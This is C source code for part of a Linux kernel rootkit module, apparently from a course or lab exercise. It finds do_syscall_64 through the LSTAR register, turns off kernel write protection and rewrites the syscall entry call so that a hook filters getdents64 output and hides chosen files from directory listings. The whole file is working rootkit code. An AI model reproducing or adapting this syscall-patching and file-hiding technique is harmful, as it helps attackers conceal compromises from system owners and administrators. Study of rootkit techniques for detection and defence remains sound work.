#include <linux/kernel.h>
#include <linux/string.h>
#include <linux/slab.h>
#include <linux/fdtable.h>
#include <linux/dcache.h>
#include <linux/delay.h>
#include <linux/irqflags.h>
#include <asm/nospec-branch.h>
#include <asm/msr-index.h>

#include "filehide_lstar.h"
#include "filehide.h"
#include "pidhide.h"
#include "openhide.h"
#include "common.h"
#include "rootkit.h"
#include "hook.h"

#define SEARCHLEN  512

atomic_t syscall64_count;

extern rootkit_t rootkit;

//Idea: build path from entry_SYSCALL_64_trampoline to do_syscall64 by gathering addresses piece by piece
//(1) JMP_NOSPEC %rdi -> (2) [entry_SYSCALL_64_stage2] jmp entry_SYSCALL_64_after_hwframe -> (3) [entry_SYSCALL_64] call do_syscall_64
//                                     ||                                                 ||=====>
//                               can be skipped ==========================================// 

//sign-extended (0x48 REX.W) mov rdi, imm
static const char *movSignExtended = "\x48\xc7\xc7";

//The first call in entry_SYSCALL_64 is the right one, so grabbing it is easy
static const char *callNearRelative = "\xE8";

static void hexdump(char *, int);
static unsigned long read_msr(unsigned int);
static inline unsigned long mem_offset(char *ptr);
static char *find_do_syscall_64(char *lstar_addr);

void g7_syscall_64(unsigned long, struct pt_regs *);
void (*do_syscall_64)(unsigned long, struct pt_regs *);
void check_getdents64(void);
static char *syscall_64_ptr;
static unsigned long old_off;

void
hide_files_lstar(void)
{     
    atomic_set(&syscall64_count, 0);
    syscall_64_ptr = find_do_syscall_64((char *)read_msr(MSR_LSTAR));

    if(!do_syscall_64 || !syscall_64_ptr) {
        DEBUG_INFO("Couldn't find do_syscall64!\n");
        return;
    }

    //Calculate new call offset to our function
    //newOff = g7_syscall_64_addr - nextOpcodeAddr
    unsigned long new_off = (unsigned long)check_getdents64 - ((unsigned long)syscall_64_ptr + 5);

    disable_protection();
    memcpy((void *)check_getdents64, "\x90\x90\x90\x90\x90", 5);
    memcpy((syscall_64_ptr + 1), &new_off, 4);
    enable_protection();

    hexdump((char *)check_getdents64, 32);
}

void
unhide_files_lstar(void)
{
    disable_protection();
    memcpy((syscall_64_ptr + 1), &old_off, 4);
    enable_protection();
    
    if ((atomic_read(&syscall64_count)) > 0)
        msleep(10000);
}

//Only use with multiples of 16..
//Best friend for this exercise, alongside https://defuse.ca/online-x86-assembler.htm
static void
hexdump(char *addr, int n)
{
    int k = 0;

    DEBUG_INFO("Hexdump:\n");
    while(k < n) {
        DEBUG_INFO("%02hhX %02hhX %02hhX %02hhX %02hhX %02hhX %02hhX %02hhX %02hhX %02hhX %02hhX %02hhX %02hhX %02hhX %02hhX %02hhX",
                addr[k], addr[k + 1], addr[k + 2], addr[k + 3], addr[k + 4], addr[k + 5], addr[k + 6], addr[k + 7], addr[k + 8], addr[k + 9], 
                addr[k + 10], addr[k + 11], addr[k + 12], addr[k + 13], addr[k + 14], addr[k + 15]);
        k += 16;
    }
}

static inline long
sign_extend(int n)
{
    if(n & (1 << 31))
        return n |= 0xFFFFFFFF00000000;

    return n;
}

//Get sign-extended 4 byte offset from memory
static inline unsigned long
mem_offset(char *ptr)
{
    unsigned long ret = 0;

    memcpy(&ret, ptr, 4);
    return sign_extend(ret);
}

//Finds do_syscall_64, sets it, and returns the pointer to the original call
static char *
find_do_syscall_64(char *lstar_addr)
{
    //Step 1: get address of stage 2 trampoline
    //If lstar_addr points to entry_SYSCALL_64 directly, skip this part (the case on rkcheck VM)
    unsigned long next_addr;

    char *stage2_ptr = strnstr(lstar_addr, movSignExtended, SEARCHLEN);

    if(!stage2_ptr)
        //we are probably at entry_SYSCALL_64
        next_addr = (unsigned long)lstar_addr;
    else
        next_addr = mem_offset(stage2_ptr + 3); //3 bytes offset to skip opcode

    //Step 2: conveniently, no 'pointer' chasing is necessary, we can just look for the jump opcode from here
    char *syscall64_call_ptr = strnstr((char *)next_addr, callNearRelative, SEARCHLEN);

    if(!syscall64_call_ptr)
        return NULL;

    //Get offset from memory
    unsigned long syscall64_off = old_off = mem_offset(syscall64_call_ptr + 1); //1 byte offset to skip call opcode

    //Store correct address of do_syscall_64
    //Offset relative to _next_ instruction -> e8 xx xx xx xx -> 5 bytes
    do_syscall_64 = ((void *)syscall64_call_ptr + 5) + syscall64_off;

    return syscall64_call_ptr;
}

//To avoid issues when unloading, check first for getdents64
//Defer other syscalls to avoid increasing our atomic count
//We use a jump to avoid building a new stack frame with call
//GCC generates a call instruction at the beginning here that we overwrite with NOPs..
//see also objdump -d -M intel g7.ko | grep -A 3 check_getdents64
void
check_getdents64(void)
{
    __asm__ volatile (
        "\tcmp $217, %%rdi\n"
        "\tje g7_syscall_64\n"
        "\tjmp *%0\n"
        :: "r"(do_syscall_64)
    );
}

void
g7_syscall_64(unsigned long nr, struct pt_regs *pt_regs)
{
    atomic_inc(&syscall64_count);
    do_syscall_64(nr, pt_regs);

    //  
    //  ( ͡°Ĺ̯ ͡° )
    //
    //https://elixir.bootlin.com/linux/v4.19.163/source/fs/buffer.c#L1218
    local_irq_enable();
    
    typedef struct linux_dirent64 *dirent64_t_ptr;

    unsigned long offset;
    dirent64_t_ptr kdirent, cur_kdirent, prev_kdirent;
    struct dentry *kdirent_dentry;

    cur_kdirent = prev_kdirent = NULL;
    int fd = (int)pt_regs->di;
    dirent64_t_ptr dirent = (dirent64_t_ptr)pt_regs->si;
    long ret = (long)regs_return_value(pt_regs);

    if (ret <= 0 || !(kdirent = (dirent64_t_ptr)kzalloc(ret, GFP_KERNEL)))
        return;

    if (copy_from_user(kdirent, dirent, ret))
        goto yield;

    kdirent_dentry = current->files->fdt->fd[fd]->f_path.dentry;

    inode_list_t hidden_inodes = { 0, NULL };
    inode_list_t_ptr hi_head, hi_tail;
    hi_head = hi_tail = &hidden_inodes;

    struct list_head *i;
    list_for_each(i, &kdirent_dentry->d_subdirs) {
        unsigned long inode;
        struct dentry *child = list_entry(i, struct dentry, d_child);

        if ((inode = must_hide_inode(child)))
            hi_tail = add_inode_to_list(hi_tail, inode);
    }

    for (offset = 0; offset < ret;) {
        cur_kdirent = (dirent64_t_ptr)((char *)kdirent + offset);

        if (list_contains_inode(hi_head, cur_kdirent->d_ino)) {
            if (cur_kdirent == kdirent) {
                ret -= cur_kdirent->d_reclen;
                memmove(cur_kdirent, (char *)cur_kdirent + cur_kdirent->d_reclen, ret);
                continue;
            }

            prev_kdirent->d_reclen += cur_kdirent->d_reclen;
        } else
            prev_kdirent = cur_kdirent;

        offset += cur_kdirent->d_reclen;
    }

    copy_to_user(dirent, kdirent, ret);

yield:
    kfree(kdirent);

    atomic_dec(&syscall64_count);
    local_irq_disable();
}

static unsigned long 
read_msr(unsigned int msr)
{
    unsigned int low, high;

    __asm__ volatile (
                    "movl %[msr], %%ecx\n\t"
                    "rdmsr\n\t"
                    "mov %%eax, %[low]\n\t"
                    "mov %%edx, %[high]"
                    : [low] "=r" (low), [high] "=r" (high)
                    : [msr] "r" (msr)
                    : "ecx", "eax", "edx"
    );

    //Get two 32bit values into a 64bit variable
    unsigned long ret = high;
    ret <<= 32;
    ret |= low;

    return ret;
}

// static void
// write_msr(unsigned int low, unsigned int high, unsigned int msr)
// {
//     __asm__ volatile (
//                     "movl $0xc0000082, %%ecx\n\t"
//                     "mov %[low], %%eax\n\t"
//                     "mov %[high], %%edx\n\t"
//                     "wrmsr"
//                     :
//                     : [low] "r" (low), [high] "r" (high)
//                     : "ecx", "eax", "edx"
//     );
// }